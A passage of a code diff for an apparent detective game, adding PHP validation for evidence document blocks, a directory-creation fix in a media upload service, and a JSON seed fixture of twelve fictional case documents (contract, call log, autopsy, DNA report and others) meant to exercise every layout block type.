+            if (!is_array($doc) || $doc === []) {
+                $fail("A {$evidenceType->value} evidence requires a {$key} envelope.");
+            }
+
+            if (empty($doc['blocks'])) {
+                $fail("A {$evidenceType->value} evidence needs at least one block.");
+            }
+
+            $allowedBlocks = self::SURFACE_BLOCKS[$surface->value] ?? [];
+
+            foreach ($doc['blocks'] as $i => $b) {
+                // Handle both array and object (stdClass) structures
+                if (is_object($b)) {
+                    $b = (array) $b;
+                }
+                $blockType = $b['type'] ?? null;
+
+                if (!in_array($blockType, $allowedBlocks, true)) {
+                    $fail("Block #{$i} type '{$blockType}' is not valid for a {$evidenceType->value} evidence.");
+                }
+            }
+        }
     }
 }
 </file>
@@ -3978,6 +4308,13 @@ class MediaService
             $filename = "{$hash}.{$extension}";
 
             $fullFilePath = $destinationPath . '/' . $filename;
+
+            // `$subfolder` may be nested (e.g. 'Evidences/Blocks'), and the
+            // target directory will not exist the first time a case slug is
+            // seen. UploadedFile::move() does not create parents.
+            if (!is_dir($destinationPath)) {
+                mkdir($destinationPath, 0755, true);
+            }
 
             // Only move the file if a file with this exact content hash doesn't already exist
             if (!file_exists($fullFilePath)) {
@@ -7500,6 +7837,1421 @@ class DatabaseSeeder extends Seeder
 }
 </file>
 
+<file path="database/seeders/data/phase1_block_documents_test_case.json">
+{
+  "case_details": {
+    "title": "PHASE 1 ENGINE — Block Document Test Case",
+    "story": "A synthetic case file whose entire purpose is to exercise every block type in the Phase 1 universal document engine. Twelve documents covering all sixteen block types across all five themes. Safe to delete; contains no real content.",
+    "min_player_XP": 0,
+    "XP_on_solve": 1000,
+    "max_strikes": 3,
+    "rating_stars": 5.0,
+    "age_rating": "Unrated",
+    "estimated_playtime": "5 Minutes",
+    "difficulty": "Standard",
+    "tags": ["Internal", "Phase1", "BlockEngine", "TestFixture"],
+    "author_name": "System",
+    "is_published": false
+  },
+
+  "evidences": [
+    {
+      "ref_id": "ev_contract",
+      "title": "01 · Contract — Service Agreement",
+      "description": "Blocks: watermark, letterhead, meta_grid, rule, prose, signature_row, spacer, stamp. Theme: case_file.",
+      "evidence_type": "document",
+      "is_initial": true,
+      "is_vital_for_conviction": false,
+      "metadata": {
+        "doc": {
+          "v": 1,
+          "theme": "case_file",
+          "page": { "w": 800, "minH": 1131, "pad": 64 },
+          "blocks": [
+            {
+              "id": "c_wm",
+              "type": "watermark",
+              "span": 12,
+              "props": { "text": "DRAFT", "rotate": -30 }
+            },
+            {
+              "id": "c_lh",
+              "type": "letterhead",
+              "span": 12,
+              "props": {
+                "agency": "Office of Legal Affairs",
+                "title": "Service Agreement",
+                "sub": "Effective on countersignature",
+                "aside": "NO. 4471",
+                "asideLabel": "Docket",
+                "rule": true
+              }
+            },
+            {
+              "id": "c_meta",
+              "type": "meta_grid",
+              "span": 12,
+              "props": {
+                "columns": 2,
+                "tone": "rows",
+                "rows": [
+                  { "label": "Parties", "value": "A. Vance / Meridian Holdings Ltd." },
+                  { "label": "Effective", "value": "2026-02-11" },
+                  { "label": "Jurisdiction", "value": "District of Northgate" },
+                  { "label": "Governing law", "value": "State Contract Code, s.14" }
+                ]
+              }
+            },
+            { "id": "c_r1", "type": "rule", "span": 12, "props": { "variant": "solid" } },
+            {
+              "id": "c_p1",
+              "type": "prose",
+              "span": 12,
+              "props": {
+                "tone": "typed",
+                "html": "<p>This Agreement is entered into by and between the parties named above. Each party represents that it has full authority to bind itself to the obligations set out herein.</p><p>Nothing in this Agreement shall be construed to limit either party&rsquo;s statutory rights. Any amendment must be executed in writing and countersigned by both parties.</p>"
+              }
+            },
+            { "id": "c_r2", "type": "rule", "span": 12, "props": { "variant": "double" } },
+            {
+              "id": "c_p2",
+              "type": "prose",
+              "span": 12,
+              "props": {
+                "tone": "serif",
+                "html": "<p><strong>IN WITNESS WHEREOF</strong> the parties have executed this Agreement as of the date first written above.</p>"
+              }
+            },
+            {
+              "id": "c_sig",
+              "type": "signature_row",
+              "span": 12,
+              "props": {
+                "columns": [{ "caption": "For the Company" }, { "caption": "Authorised Signatory" }]
+              }
+            },
+            { "id": "c_sp", "type": "spacer", "span": 12, "props": { "height": 16 } },
+            {
+              "id": "c_st",
+              "type": "stamp",
+              "span": 4,
+              "style": { "align": "end" },
+              "props": { "text": "Executed", "tone": "confidential" }
+            }
+          ]
+        }
+      }
+    },
+
+    {
+      "ref_id": "ev_memo",
+      "title": "02 · Memo — Internal Notes",
+      "description": "Blocks: letterhead, meta_grid, rule, prose(handwritten), image(polaroid), annotation. Theme: notebook.",
+      "evidence_type": "document",
+      "is_initial": true,
+      "is_vital_for_conviction": false,
+      "metadata": {
+        "doc": {
+          "v": 1,
+          "theme": "notebook",
+          "page": { "w": 800, "minH": 1131, "pad": 64 },
+          "blocks": [
+            {
+              "id": "m_lh",
+              "type": "letterhead",
+              "span": 12,
+              "props": {
+                "agency": "Internal",
+                "title": "Memo",
+                "sub": "To: Detective Unit 4",
+                "aside": "MEMO",
+                "asideLabel": "File",
+                "rule": true
+              }
+            },
+            {
+              "id": "m_meta",
+              "type": "meta_grid",
+              "span": 12,
+              "props": {
+                "columns": 1,
+                "tone": "plain",
+                "rows": [
+                  { "label": "From", "value": "Det. R. Okonkwo" },
+                  { "label": "Date", "value": "2026-03-04" },
+                  { "label": "Re", "value": "Timeline discrepancy — witness Vance" }
+                ]
+              }
+            },
+            { "id": "m_r1", "type": "rule", "span": 12, "props": { "variant": "dashed" } },
+            {
+              "id": "m_p1",
+              "type": "prose",
+              "span": 12,
+              "props": {
+                "tone": "handwritten",
+                "html": "Working notes. Not for distribution outside the unit."
+              }
+            },
+            {
+              "id": "m_p2",
+              "type": "prose",
+              "span": 12,
+              "props": {
+                "tone": "handwritten",
+                "html": "Follow up on the statement taken Tuesday. Two details do not line up with the timeline we have, and the second location in her account is four blocks from where the witness placed her."
+              }
+            },
+            {
+              "id": "m_img",
+              "type": "image",
+              "span": 6,
+              "props": {
+                "url": "/assets/cases/aaod-rgl-alkhf/Evidences/3899b2f7e58951ed5e95398d0521385c0b42bbfbd5618ab8c387a9b1f4157548.jpg",
+                "caption": "Photograph taped to the memo",
+                "filter": "polaroid",
+                "width": 210,
+                "rotate": -2
+              }
+            },
+            {
+              "id": "m_ann",
+              "type": "annotation",
+              "span": 6,
+              "props": { "text": "confirm before next interview", "rotate": -3 }
+            }
+          ]
+        }
+      }
+    },
+
+    {
+      "ref_id": "ev_correspondence",
+      "title": "03 · Correspondence — Municipal Records",
+      "description": "Blocks: letterhead, meta_grid, rule, prose, spacer, signature_row, image(plain). Theme: case_file.",
+      "evidence_type": "document",
+      "is_initial": true,
+      "is_vital_for_conviction": false,
+      "metadata": {
+        "doc": {
+          "v": 1,
+          "theme": "case_file",
+          "page": { "w": 800, "minH": 1131, "pad": 64 },
+          "blocks": [
+            {
+              "id": "r_lh",
+              "type": "letterhead",
+              "span": 12,
+              "props": {
+                "agency": "Municipal Records",
+                "title": "Letter of Correspondence",
+                "sub": "Sent via registered post",
+                "aside": "2026/RM/118",
+                "asideLabel": "Ref",
+                "rule": true
+              }
+            },
+            {
+              "id": "r_meta",
+              "type": "meta_grid",
+              "span": 12,
+              "props": {
+                "columns": 2,
+                "tone": "rows",
+                "rows": [
+                  { "label": "From", "value": "Municipal Records Office" },
+                  { "label": "To", "value": "Det. R. Okonkwo" },
+                  { "label": "Sent", "value": "2026-01-22" },
+                  { "label": "Received", "value": "2026-01-29" }
+                ]
+              }
+            },
+            { "id": "r_r1", "type": "rule", "span": 12, "props": { "variant": "solid" } },
+            {
+              "id": "r_p1",
+              "type": "prose",
+              "span": 12,
+              "props": {
+                "tone": "typed",
+                "html": "<p>Sir or Madam,</p><p>We acknowledge receipt of your enquiry of the date above. The records requested are held in the municipal archive and are available for inspection during business hours.</p><p>You must present identification and a written authority before any copy will be released.</p>"
+              }
+            },
+            { "id": "r_sp", "type": "spacer", "span": 12, "props": { "height": 8 } },
+            {
+              "id": "r_p2",
+              "type": "prose",
+              "span": 12,
+              "props": { "tone": "typed", "html": "<p>Yours faithfully,</p>" }
+            },
+            {
+              "id": "r_sig",
+              "type": "signature_row",
+              "span": 8,
+              "props": { "columns": [{ "caption": "Records Clerk" }] }
+            },
+            {
+              "id": "r_img",
+              "type": "image",
+              "span": 4,
+              "props": {
+                "url": "/assets/cases/Case-cover.png",
+                "caption": "Municipal seal",
+                "filter": "plain",
+                "width": 110
+              }
+            }
+          ]
+        }
+      }
+    },
+
+    {
+      "ref_id": "ev_financial",
+      "title": "04 · Financial — Account Statement",
+      "description": "Blocks: watermark, letterhead, meta_grid(boxed), table(number, negative), spacer, barcode, stamp. Theme: ledger.",
+      "evidence_type": "document",
+      "is_initial": true,
+      "is_vital_for_conviction": true,
+      "metadata": {
+        "doc": {
+          "v": 1,
+          "theme": "ledger",
+          "page": { "w": 800, "minH": 1131, "pad": 64 },
+          "blocks": [
+            {
+              "id": "f_wm",
+              "type": "watermark",
+              "span": 12,
+              "props": { "text": "COPY", "rotate": -30 }
+            },
+            {
+              "id": "f_lh",
+              "type": "letterhead",
+              "span": 12,
+              "props": {
+                "agency": "Meridian Holdings",
+                "title": "Account Statement",
+                "sub": "Consolidated, all branches",
+                "aside": "****7741",
+                "asideLabel": "Account",
+                "rule": true
+              }
+            },
+            {
+              "id": "f_meta",
+              "type": "meta_grid",
+              "span": 12,
+              "props": {
+                "columns": 2,
+                "tone": "boxed",
+                "rows": [
+                  { "label": "Account holder", "value": "A. Vance" },
+                  { "label": "Account no.", "value": "****7741" },
+                  { "label": "Period", "value": "2026-01-01 → 2026-01-31" },
+                  { "label": "Currency", "value": "USD" }
+                ]
+              }
+            },
+            {
+              "id": "f_tbl",
+              "type": "table",
+              "span": 12,
+              "props": {
+                "tone": "ledger",
+                "caption": "Statement of activity",
+                "columns": [
+                  { "key": "date", "label": "Date" },
+                  { "key": "description", "label": "Description" },
+                  { "key": "amount", "label": "Amount", "type": "number", "align": "end" }
+                ],
+                "rows": [
+                  { "date": "2026-01-03", "description": "Salary — Northgate Clinic", "amount": 4200 },
+                  { "date": "2026-01-07", "description": "Transfer to K. Aldana", "amount": -1850 },
+                  { "date": "2026-01-11", "description": "Rent — 12 Ellery St", "amount": -1450 },
+                  { "date": "2026-01-14", "description": "Transfer to K. Aldana", "amount": -2400 },
+                  { "date": "2026-01-19", "description": "Utility — municipal", "amount": -212 },
+                  { "date": "2026-01-27", "description": "Transfer to K. Aldana", "amount": -3100 },
+                  { "date": "2026-01-31", "description": "Closing balance", "amount": 12884 }
+                ],
+                "emptyMessage": "No activity recorded for this period."
+              }
+            },
+            { "id": "f_sp", "type": "spacer", "span": 12, "props": { "height": 12 } },
+            {
+              "id": "f_bc",
+              "type": "barcode",
+              "span": 6,
+              "props": { "value": "0000 7741 2026" }
+            },
+            {
+              "id": "f_st",
+              "type": "stamp",
+              "span": 4,
+              "style": { "align": "end" },
+              "props": { "text": "Verified", "tone": "confidential" }
+            }
+          ]
+        }
+      }
+    },
+
+    {
+      "ref_id": "ev_phone",
+      "title": "05 · Phone Records — Subscriber Call Log",
+      "description": "Blocks: letterhead, meta_grid, table(log tone, badges), spacer, barcode. Theme: ledger.",
+      "evidence_type": "document",
+      "is_initial": true,
+      "is_vital_for_conviction": false,
+      "metadata": {
+        "doc": {
+          "v": 1,
+          "theme": "ledger",
+          "page": { "w": 800, "minH": 1131, "pad": 64 },
+          "blocks": [
+            {
+              "id": "p_lh",
+              "type": "letterhead",
+              "span": 12,
+              "props": {
+                "agency": "Telecommunications",
+                "title": "Subscriber Call Log",
+                "sub": "Lawful production order 2026-LPO-0031",
+                "aside": "+1 555 0142",
+                "asideLabel": "Line",
+                "rule": true
+              }
+            },
+            {
+              "id": "p_meta",
+              "type": "meta_grid",
+              "span": 12,
+              "props": {
+                "columns": 2,
+                "tone": "rows",
+                "rows": [
+                  { "label": "Subscriber", "value": "A. Vance" },
+                  { "label": "Number", "value": "+1 555 0142" },
+                  { "label": "Period", "value": "2026-01-01 → 2026-01-31" },
+                  { "label": "Produced", "value": "2026-02-03" }
+                ]
+              }
+            },
+            {
+              "id": "p_tbl",
+              "type": "table",
+              "span": 12,
+              "props": {
+                "tone": "log",
+                "columns": [
+                  { "key": "date", "label": "Date" },
+                  { "key": "number", "label": "Number", "type": "mono" },
+                  {
+                    "key": "direction",
+                    "label": "Direction",
+                    "type": "badge",
+                    "tones": { "incoming": "in", "outgoing": "out", "missed": "missed" }
+                  },
+                  { "key": "duration", "label": "Duration", "type": "mono", "align": "end" }
+                ],
+                "rows": [
+                  { "date": "2026-01-07 09:12", "number": "+1 555 9981", "direction": "outgoing", "duration": "04:12" },
+                  { "date": "2026-01-07 09:41", "number": "+1 555 9981", "direction": "incoming", "duration": "06:55" },
+                  { "date": "2026-01-09 22:03", "number": "+1 555 4470", "direction": "outgoing", "duration": "11:20" },
+                  { "date": "2026-01-11 13:30", "number": "+1 555 2210", "direction": "missed", "duration": "—" },
+                  { "date": "2026-01-14 08:55", "number": "+1 555 9981", "direction": "outgoing", "duration": "02:08" },
+                  { "date": "2026-01-21 19:44", "number": "+1 555 4470", "direction": "incoming", "duration": "23:47" },
+                  { "date": "2026-01-28 02:17", "number": "+1 555 9981", "direction": "missed", "duration": "—" }
+                ],
+                "emptyMessage": "No calls originated or terminated on this line in the period."
+              }
+            },
+            { "id": "p_sp", "type": "spacer", "span": 12, "props": { "height": 12 } },
+            { "id": "p_bc", "type": "barcode", "span": 6, "props": { "value": "TEL 555 0142" } }
+          ]
+        }
+      }
+    },
+
+    {
+      "ref_id": "ev_background",
+      "title": "06 · Background Check — Subject Record",
+      "description": "Blocks: letterhead, meta_grid(boxed), prose(redacted/highlighted spans), image(mugshot), redaction, rule. Theme: dossier.",
+      "evidence_type": "document",
+      "is_initial": true,
+      "is_vital_for_conviction": false,
+      "metadata": {
+        "doc": {
+          "v": 1,
+          "theme": "dossier",
+          "page": { "w": 800, "minH": 1131, "pad": 64 },
+          "blocks": [
+            {
+              "id": "b_lh",
+              "type": "letterhead",
+              "span": 12,
+              "props": {
+                "agency": "Records Bureau",
+                "title": "Background Record",
+                "sub": "Full scope search — county and federal",
+                "aside": "BR-2026-0912",
+                "asideLabel": "File",
+                "rule": true
+              }
+            },
+            {
+              "id": "b_meta",
+              "type": "meta_grid",
+              "span": 12,
+              "props": {
+                "columns": 2,
+                "tone": "boxed",
+                "rows": [
+                  { "label": "Subject", "value": "A. Vance" },
+                  { "label": "DOB", "value": "1988-06-14" },
+                  { "label": "Search date", "value": "2026-02-18" },
+                  { "label": "Scope", "value": "County + federal" }
+                ]
+              }
+            },
+            {
+              "id": "b_img",
+              "type": "image",
+              "span": 4,
+              "props": {
+                "url": "/assets/cases/aaod-rgl-alkhf/Evidences/3899b2f7e58951ed5e95398d0521385c0b42bbfbd5618ab8c387a9b1f4157548.jpg",
+                "caption": "Subject photograph",
+                "filter": "mugshot",
+                "width": 150
+              }
+            },
+            {
+              "id": "b_p1",
+              "type": "prose",
+              "span": 8,
+              "props": {
+                "tone": "mono",
+                "html": "<p><strong>Prior addresses</strong></p><ul><li>Current — 12 Ellery St, verified</li><li>Previous — <span class=\"redacted\">withheld</span></li></ul>"
+              }
+            },
+            {
+              "id": "b_p2",
+              "type": "prose",
+              "span": 12,
+              "props": {
+                "tone": "mono",
+                "html": "<p><strong>Known associates</strong></p><p>Two entries returned. One is a <span class=\"redacted\">minor</span> conviction; the other is a civil matter settled out of court. See the enclosed record for the <span class=\"highlighted\">sealed address history</span>.</p>"
+              }
+            },
+            {
+              "id": "b_rd",
+              "type": "redaction",
+              "span": 12,
+              "props": { "lines": 3, "label": "Redacted pursuant to court order 4471" }
+            },
+            { "id": "b_r1", "type": "rule", "span": 12, "props": { "variant": "solid" } },
+            {
+              "id": "b_p3",
+              "type": "prose",
+              "span": 12,
+              "props": {
+                "tone": "mono",
+                "html": "<p>Prepared by an automated records request. No inference of guilt attaches to any entry listed above.</p>"
+              }
+            }
+          ]
+        }
+      }
+    },
+
+    {
+      "ref_id": "ev_journal",
+      "title": "07 · Journal — Private Diary",
+      "description": "Blocks: prose(handwritten), meta_grid(plain), rule, spacer, signature_row. Theme: notebook.",
+      "evidence_type": "document",
+      "is_initial": false,
+      "is_vital_for_conviction": false,
+      "metadata": {
+        "doc": {
+          "v": 1,
+          "theme": "notebook",
+          "page": { "w": 800, "minH": 1131, "pad": 48 },
+          "blocks": [
+            {
+              "id": "j_p0",
+              "type": "prose",
+              "span": 12,
+              "props": { "tone": "handwritten", "html": "Journal — private" }
+            },
+            {
+              "id": "j_meta",
+              "type": "meta_grid",
+              "span": 12,
+              "props": {
+                "columns": 1,
+                "tone": "plain",
+                "rows": [
+                  { "label": "Entry", "value": "2026-01-19" },
+                  { "label": "Author", "value": "A. Vance" }
+                ]
+              }
+            },
+            { "id": "j_r1", "type": "rule", "span": 12, "props": { "variant": "dotted" } },
+            {
+              "id": "j_p1",
+              "type": "prose",
+              "span": 12,
+              "props": {
+                "tone": "handwritten",
+                "html": "Woke before the alarm again. The thing I cannot shake is not the argument but the quiet after it — how fast the room went back to normal, as though nothing had been said at all."
+              }
+            },
+            {
+              "id": "j_p2",
+              "type": "prose",
+              "span": 12,
+              "props": {
+                "tone": "handwritten",
+                "html": "Wrote the names down in order. Cross-checked two of them against the register. The second one is misspelled on the form, which is the only reason I found it."
+              }
+            },
+            { "id": "j_sp", "type": "spacer", "span": 12, "props": { "height": 20 } },
+            {
+              "id": "j_sig",
+              "type": "signature_row",
+              "span": 6,
+              "props": { "columns": [{ "caption": "Author" }] }
+            }
+          ]
+        }
+      }
+    },
+
+    {
+      "ref_id": "ev_autopsy",
+      "title": "08 · Autopsy — Examination Report",
+      "description": "Blocks: letterhead, meta_grid(boxed 4-col), two_column(diagram), rule, prose, spacer, signature_row, stamp. Theme: lab.",
+      "evidence_type": "forensic",
+      "is_initial": true,
+      "is_vital_for_conviction": true,
+      "metadata": {
+        "doc": {
+          "v": 1,
+          "theme": "lab",
+          "page": { "w": 800, "minH": 1131, "pad": 32 },
+          "blocks": [
+            {
+              "id": "a_lh",
+              "type": "letterhead",
+              "span": 12,
+              "props": {
+                "agency": "Forensic Pathology",
+                "title": "Autopsy Report",
+                "sub": "Office of the Chief Medical Examiner",
+                "aside": "2026-ME-0044",
+                "asideLabel": "Case",
+                "rule": true
+              }
+            },
+            {
+              "id": "a_meta",
+              "type": "meta_grid",
+              "span": 12,
+              "props": {
+                "columns": 4,
+                "tone": "boxed",
+                "rows": [
+                  { "label": "Case", "value": "2026-ME-0044" },
+                  { "label": "Decedent", "value": "K. Aldana" },
+                  { "label": "Exam date", "value": "2026-01-16" },
+                  { "label": "Examiner", "value": "Dr. H. Sadler" }
+                ]
+              }
+            },
+            {
+              "id": "a_2c",
+              "type": "two_column",
+              "span": 12,
+              "props": {
+                "gap": 28,
+                "rightWidth": 170,
+                "left": [
+                  {
+                    "id": "a_tbl",
+                    "type": "table",
+                    "span": 12,
+                    "props": {
+                      "tone": "ledger",
+                      "caption": "Findings",
+                      "columns": [
+                        { "key": "finding", "label": "Finding" },
+                        { "key": "note", "label": "Note" }
+                      ],
+                      "rows": [
+                        { "finding": "Contusion", "note": "Left parietal, 4cm" },
+                        { "finding": "Ligature mark", "note": "Incomplete, anterior neck" },
+                        { "finding": "Defence injuries", "note": "None recorded" }
+                      ],
+                      "emptyMessage": "No external findings recorded."
+                    }
+                  },
+                  {
+                    "id": "a_p1",
+                    "type": "prose",
+                    "span": 12,
+                    "props": {
+                      "tone": "mono",
+                      "html": "<p><strong>Cause of death</strong></p><p>Pending. See supplemental toxicology.</p>"
+                    }
+                  }
+                ],
+                "right": [
+                  {
+                    "id": "a_dg",
+                    "type": "diagram",
+                    "span": 12,
+                    "props": { "preset": "body_outline", "caption": "Reference diagram" }
+                  }
+                ]
+              }
+            },
+            { "id": "a_r1", "type": "rule", "span": 12, "props": { "variant": "solid" } },
+            { "id": "a_sp", "type": "spacer", "span": 12, "props": { "height": 12 } },
+            {
+              "id": "a_sig",
+              "type": "signature_row",
+              "span": 12,
+              "props": { "columns": [{ "caption": "Chief Medical Examiner" }] }
+            },
+            {
+              "id": "a_st",
+              "type": "stamp",
+              "span": 4,
+              "style": { "align": "end" },
+              "props": { "text": "Preliminary", "tone": "official" }
+            }
+          ]
+        }
+      }
+    },
+
+    {
+      "ref_id": "ev_ballistics",
+      "title": "09 · Ballistics — Firearms Examination",
+      "description": "Blocks: letterhead, meta_grid(boxed), table, spacer, prose, image(micrograph), annotation, signature_row. Theme: lab.",
+      "evidence_type": "forensic",
+      "is_initial": false,
+      "is_vital_for_conviction": true,
+      "metadata": {
+        "doc": {
+          "v": 1,
+          "theme": "lab",
+          "page": { "w": 800, "minH": 1131, "pad": 32 },
+          "blocks": [
+            {
+              "id": "l_lh",
+              "type": "letterhead",
+              "span": 12,
+              "props": {
+                "agency": "Firearms & Ballistics",
+                "title": "Ballistics Examination",
+                "sub": "NIBIN / AFTE comparison",
+                "aside": "2026-BL-8842",
+                "asideLabel": "Report",
+                "rule": true
+              }
+            },
+            {
+              "id": "l_meta",
+              "type": "meta_grid",
+              "span": 12,
+              "props": {
+                "columns": 3,
+                "tone": "boxed",
+                "rows": [
+                  { "label": "Evidence", "value": "EX-009 (recovered)" },
+                  { "label": "Examiner", "value": "M. Ferreira" },
+                  { "label": "Received", "value": "2026-01-17" }
+                ]
+              }
+            },
+            {
+              "id": "l_tbl",
+              "type": "table",
+              "span": 12,
+              "props": {
+                "tone": "ledger",
+                "caption": "Microscopic comparison",
+                "columns": [
+                  { "key": "land", "label": "Land impression" },
+                  { "key": "quantity", "label": "Quantity" },
+                  { "key": "dimensions", "label": "Dimensions" },
+                  { "key": "conclusion", "label": "Conclusion" }
+                ],
+                "rows": [
+                  { "land": "Ejector", "quantity": "1", "dimensions": "0.038 × 0.014 in", "conclusion": "Consistent" },
+                  { "land": "Extractor", "quantity": "1", "dimensions": "0.041 × 0.012 in", "conclusion": "Consistent" },
+                  { "land": "Firing pin", "quantity": "Insufficient", "dimensions": "—", "conclusion": "Not suitable" }
+                ],
+                "emptyMessage": "No comparison performed on this item."
+              }
+            },
+            {
+              "id": "l_img",
+              "type": "image",
+              "span": 6,
+              "props": {
+                "url": "/assets/cases/tgrb/Levels/ee4705758793f54f17e2beb10e741c8d09266896925330fc4e78d9ec2e9e13ab.png",
+                "caption": "Microscope capture — ejector port",
+                "filter": "micrograph",
+                "width": 320
+              }
+            },
+            {
+              "id": "l_ann",
+              "type": "annotation",
+              "span": 6,
+              "props": { "text": "ask about the second firing", "rotate": -2 }
+            },
+            { "id": "l_sp", "type": "spacer", "span": 12, "props": { "height": 16 } },
+            {
+              "id": "l_p1",
+              "type": "prose",
+              "span": 12,
+              "props": {
+                "tone": "mono",
+                "html": "<p>Examiner&rsquo;s opinion is recorded above. Items not suitable for comparison are documented with the reason.</p>"
+              }
+            },
+            {
+              "id": "l_sig",
+              "type": "signature_row",
+              "span": 12,
+              "props": { "columns": [{ "caption": "Examiner" }] }
+            }
+          ]
+        }
+      }
+    },
+
+    {
+      "ref_id": "ev_dna",
+      "title": "10 · DNA — STR Analysis",
+      "description": "Blocks: letterhead, meta_grid(boxed), diagram(electropherogram), rule, table, prose, barcode, stamp. Theme: lab.",
+      "evidence_type": "forensic",
+      "is_initial": false,
+      "is_vital_for_conviction": true,
+      "metadata": {
+        "doc": {
+          "v": 1,
+          "theme": "lab",
+          "page": { "w": 800, "minH": 1131, "pad": 32 },
+          "blocks": [
+            {
+              "id": "d_lh",
+              "type": "letterhead",
+              "span": 12,
+              "props": {
+                "agency": "Genetic Laboratory",
+                "title": "STR Analysis Report",
+                "sub": "Combined DNA Index System",
+                "aside": "DNA-2026-0113",
+                "asideLabel": "Sample",
+                "rule": true
+              }
+            },
+            {
+              "id": "d_meta",
+              "type": "meta_grid",
+              "span": 12,
+              "props": {
+                "columns": 3,
+                "tone": "boxed",
+                "rows": [
+                  { "label": "Evidence", "value": "EX-009" },
+                  { "label": "Sample type", "value": "Buccal swab" },
+                  { "label": "Analyst", "value": "P. Nwosu" }
+                ]
+              }
+            },
+            {
+              "id": "d_dg",
+              "type": "diagram",
+              "span": 12,
+              "props": {
+                "preset": "electropherogram",
+                "caption": "Crime scene sample vs. database record"
+              }
+            },
+            { "id": "d_r1", "type": "rule", "span": 12, "props": { "variant": "solid" } },
+            {
+              "id": "d_tbl",
+              "type": "table",
+              "span": 12,
+              "props": {
+                "tone": "ledger",
+                "columns": [
+                  { "key": "result", "label": "Result" },
+                  { "key": "value", "label": "Value" }
+                ],
+                "rows": [
+                  { "result": "Probability of match", "value": "1.2 × 10⁻¹⁸" },
+                  { "result": "Identified subject", "value": "A. Vance" },
+                  { "result": "Loci profiled", "value": "20 / 20" }
+                ]
+              }
+            },
+            {
+              "id": "d_p1",
+              "type": "prose",
+              "span": 12,
+              "props": {
+                "tone": "mono",
+                "html": "<p>Conclusions are reported for investigative use only and are not a substitute for a legal determination of identity.</p>"
+              }
+            },
+            { "id": "d_bc", "type": "barcode", "span": 6, "props": { "value": "CODIS 2026 0113" } },
+            {
+              "id": "d_st",
+              "type": "stamp",
+              "span": 4,
+              "style": { "align": "end" },
+              "props": { "text": "CODIS Verified", "tone": "official" }
+            }
+          ]
+        }
+      }
+    },
+
+    {
+      "ref_id": "ev_trace",
+      "title": "11 · Trace Analysis — Mass Spectrometry",
+      "description": "Blocks: letterhead, meta_grid(boxed), diagram(mass_spec), rule, meta_grid, prose, stamp. Theme: lab.",
+      "evidence_type": "forensic",
+      "is_initial": false,
+      "is_vital_for_conviction": false,
+      "metadata": {
+        "doc": {
+          "v": 1,
+          "theme": "lab",
+          "page": { "w": 800, "minH": 1131, "pad": 32 },
+          "blocks": [
+            {
+              "id": "t_lh",
+              "type": "letterhead",
+              "span": 12,
+              "props": {
+                "agency": "Advanced Laboratory",
+                "title": "Trace Analysis",
+                "sub": "Mass spectrometry screening",
+                "aside": "TR-2026-0071",
+                "asideLabel": "Sample",
+                "rule": true
+              }
+            },
+            {
+              "id": "t_meta",
+              "type": "meta_grid",
+              "span": 12,
+              "props": {
+                "columns": 3,
+                "tone": "boxed",
+                "rows": [
+                  { "label": "Sample", "value": "EX-011 (fibre)" },
+                  { "label": "Scan date", "value": "2026-01-20" },
+                  { "label": "Instrument", "value": "GC-MS 2010" }
+                ]
+              }
+            },
+            {
+              "id": "t_dg",
+              "type": "diagram",
+              "span": 12,
+              "props": { "preset": "mass_spec", "caption": "Reference spectrum vs. library match" }
+            },
+            { "id": "t_r1", "type": "rule", "span": 12, "props": { "variant": "solid" } },
+            {
+              "id": "t_meta2",
+              "type": "meta_grid",
+              "span": 12,
+              "props": {
+                "columns": 2,
+                "tone": "rows",
+                "rows": [
+                  { "label": "Material", "value": "Synthetic polymer, aramid blend" },
+                  { "label": "Origin", "value": "Protective outerwear, law enforcement issue" }
+                ]
+              }
+            },
+            {
+              "id": "t_p1",
+              "type": "prose",
+              "span": 12,
+              "props": {
+                "tone": "mono",
+                "html": "<p>Analysis complete. Origin is stated at the confidence level recorded above; higher confidence tiers require a confirmatory run.</p>"
+              }
+            },
+            {
+              "id": "t_st",
+              "type": "stamp",
+              "span": 4,
+              "style": { "align": "end" },
+              "props": { "text": "Complete", "tone": "official" }
+            }
+          ]
+        }
+      }
+    },
+
+    {
+      "ref_id": "ev_digital",
+      "title": "12 · Digital Forensics — Device Examination",
+      "description": "Blocks: letterhead, meta_grid(boxed), prose, list(ordered), rule, spacer, signature_row, watermark. Theme: dossier.",
+      "evidence_type": "forensic",
+      "is_initial": false,
+      "is_vital_for_conviction": false,
+      "metadata": {
+        "doc": {
+          "v": 1,
+          "theme": "dossier",
+          "page": { "w": 800, "minH": 1131, "pad": 64 },
+          "blocks": [
+            {
+              "id": "g_wm",
+              "type": "watermark",
+              "span": 12,
+              "props": { "text": "EVIDENCE", "rotate": -30 }
+            },
+            {
+              "id": "g_lh",
+              "type": "letterhead",
+              "span": 12,
+              "props": {
+                "agency": "Digital Forensics Unit",
+                "title": "Device Examination",
+                "sub": "Logical extraction report",
+                "aside": "DF-2026-0207",
+                "asideLabel": "Device",
+                "rule": true
+              }
+            },
+            {
+              "id": "g_meta",
+              "type": "meta_grid",
+              "span": 12,
+              "props": {
+                "columns": 4,
+                "tone": "boxed",
+                "rows": [
+                  { "label": "Exhibit", "value": "EX-012" },
+                  { "label": "Device", "value": "Handset, black" },
+                  { "label": "Acquired", "value": "2026-01-16" },
+                  { "label": "Examiner", "value": "S. Iqbal" }
+                ]
+              }
+            },
+            {
+              "id": "g_p1",
+              "type": "prose",
+              "span": 12,
+              "props": {
+                "tone": "mono",
+                "html": "<p><strong>Extraction summary</strong></p>"
+              }
+            },
+            {
+              "id": "g_li",
+              "type": "list",
+              "span": 12,
+              "props": {
+                "ordered": true,
+                "items": [
+                  "Logical extraction completed; image verified against acquisition hash.",
+                  "Deleted artefacts recovered from unallocated space.",
+                  "Application data isolated; passcode not defeated during this examination.",
+                  "Two messages to an unassociated number deleted at 02:14 on 2026-01-15."
+                ]
+              }
+            },
+            { "id": "g_r1", "type": "rule", "span": 12, "props": { "variant": "dotted" } },
+            {
+              "id": "g_p2",
+              "type": "prose",
+              "span": 12,
+              "props": {
+                "tone": "mono",
+                "html": "<p>Artifacts are presented in acquisition order. Interpretation of individual artefacts is deferred to the examining analyst.</p>"
+              }
+            },
+            { "id": "g_sp", "type": "spacer", "span": 12, "props": { "height": 12 } },
+            {
+              "id": "g_sig",
+              "type": "signature_row",
+              "span": 12,
+              "props": { "columns": [{ "caption": "Examiner" }] }
+            }
+          ]
+        }
+      }
+    },
+        {
+      "ref_id": "ev_disk_imaging",
+      "title": "13 · Digital — Disk Imaging Session",
